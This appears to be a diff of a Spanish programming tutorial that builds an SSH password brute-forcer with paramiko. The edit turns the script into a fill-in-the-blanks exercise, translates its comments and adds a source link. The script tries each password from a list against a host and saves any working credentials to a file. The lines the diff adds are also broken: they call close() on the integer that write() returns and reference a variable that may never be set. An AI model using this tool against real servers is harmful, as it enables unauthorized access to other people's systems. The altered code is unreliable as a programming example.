@@ -49,13 +49,13 @@ BLUE  = Fore.BLUE
 Ahora construiremos una función que, dado nombre de host, un usuario y una contraseña, nos diga si la combinación es correcta:
 
 ```python
-def is_ssh_open(hostname, username, password):
+def is_ssh_open(_______, _______, _______):
     # initialize SSH client
     client = paramiko.SSHClient()
     # add to know hosts
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        client.connect(hostname=hostname, username=username, password=password, timeout=3)
+        client.connect(hostname=_______, username=_______, password=_______, timeout=3)
     except socket.timeout:
         # this is when host is unreachable
         print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
@@ -98,19 +98,21 @@ if __name__ == "__main__":
     parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
     parser.add_argument("-u", "--user", help="Host username.")
 
-    # parse passed arguments
+    # parseamos los argumentos que se nos han pasado
     args = parser.parse_args()
-    host = args.host
-    passlist = args.passlist
-    user = args.user
-    # read the file
-    passlist = open(passlist).read().splitlines()
-    # brute-force
+    host = args._______
+    passlist = args._______
+    user = args._______
+    # leer el fichero
+    passlist = open(_______).read().splitlines()
+    # fuerza bruta
     for password in passlist:
         if is_ssh_open(host, user, password):
-            # if combo is valid, save it to a file
-            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
+            global credenciales
+            # Si la combinación es válida, la guardamos en un archivo
+            credenciales = open("credentials.txt", "w").write(f"{user}@{host}:{password}")
             break
+    credenciales.close()
 ```
 Básicamente *parseamos* los argumentos para obtener el nombre de host, el nombre de usuario y el fichero con el listado de contraseñas sobre las que iteraremos. 
 
@@ -121,3 +123,4 @@ Básicamente *parseamos* los argumentos para obtener el nombre de host, el nombr
 
 [HOW TO - Programación con sockets](https://docs.python.org/es/3/howto/sockets.html)
 
+[How to Brute-Force SSH Servers in Python](https://www.thepythoncode.com/article/brute-force-ssh-servers-using-paramiko-in-python)
